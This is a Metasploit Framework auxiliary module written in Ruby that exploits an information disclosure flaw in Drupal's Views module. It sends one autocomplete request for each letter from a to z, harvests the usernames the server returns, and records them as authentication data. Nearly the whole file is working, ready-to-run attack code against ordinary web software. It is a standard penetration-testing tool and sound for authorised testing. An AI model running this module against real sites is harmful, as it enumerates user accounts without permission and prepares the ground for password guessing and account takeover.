##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::WmapScanServer
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Drupal Views Module Users Enumeration',
			'Description'    => %q{
				This module exploits an information disclosure vulnerability in the 'Views'
				module of Drupal, brute-forcing the first 10 usernames from 'a' to 'z'
			},
			'Author'         =>
				[
					'Justin Klein Keane', #Original Discovery
					'Robin Francois <rof[at]navixia.com>'
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['URL', 'http://www.madirish.net/node/465'],
				],
			'DisclosureDate' => 'Jul 2 2010'
		))

		register_options(
			[
				OptString.new('PATH', [true, "Drupal Path", "/"])
			], self.class)
	end

	def check(base_uri)
		res = send_request_cgi({
			'uri'     => base_uri,
			'method'  => 'GET',
			'headers' => { 'Connection' => 'Close' }
		}, 25)

		if not res
			return false
		elsif res.message != 'OK' or res.body != '[  ]'
			return false
		else
			return true
		end
	end

	def run_host(ip)
		# Make sure the URIPATH begins with '/'
		if datastore['PATH'][0] != '/'
			datastore['PATH'] = '/' + datastore['PATH']
		end

		# Make sure the URIPATH ends with /
		if datastore['PATH'][-1] != '/'
			datastore['PATH'] = datastore['PATH'] + '/'
		end

		enum_uri = datastore['PATH'] + "?q=admin/views/ajax/autocomplete/user/"

		# Check if remote host is available or appears vulnerable
		if not check(enum_uri)
			print_status("#{ip} does not appear to be vulnerable, will not continue")
			return
		end

		print_status("Begin enumerating users at #{ip}")

		results = []
		('a'..'z').each do |l|
			vprint_status("Iterating on letter: #{l}")

			res = send_request_cgi({
				'uri'     => enum_uri+l,
				'method'  => 'GET',
				'headers' => { 'Connection' => 'Close' }
			}, 25)

			if (res and res.message == "OK")
				user_list = res.body.scan(/\w+/)
				if user_list.empty?
					vprint_line("\tFound: Nothing")
				else
					vprint_line("\tFound: #{user_list.inspect}")
					results << user_list
				end
			else
				print_error("Unexpected results from server")
				return
			end
		end

		final_results = results.flatten.uniq

		print_status("Done. " + final_results.length.to_s + " usernames found...")

		final_results.each do |user|
			report_auth_info(
				:host => Rex::Socket.getaddress(datastore['RHOST']),
				:port => datastore['RPORT'],
				:user => user,
				:type => "drupal_user"
			)
		end
	end
end
